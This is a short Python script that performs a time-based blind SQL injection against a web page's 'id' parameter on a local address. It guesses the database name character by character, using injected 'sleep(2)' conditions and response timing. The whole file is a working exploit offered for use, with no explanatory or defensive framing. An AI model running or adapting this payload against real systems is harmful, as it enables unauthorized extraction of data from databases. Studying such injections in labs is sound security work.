#!/usr/bin/python3
from pwn import log
import string, requests, time

characters = string.ascii_lowercase
bar = log.progress("Database")

value = ""

for position in range(0,20):
    for character in characters:
        tstr = time.time()
        requests.get(f"http://172.17.0.2/example.php?id=1' and if(substr(database(),{position},1)='{character}', sleep(2),1)-- -")
        tend = time.time()
        if (tend - tstr) > 2:
            value += character
            bar.status(value)
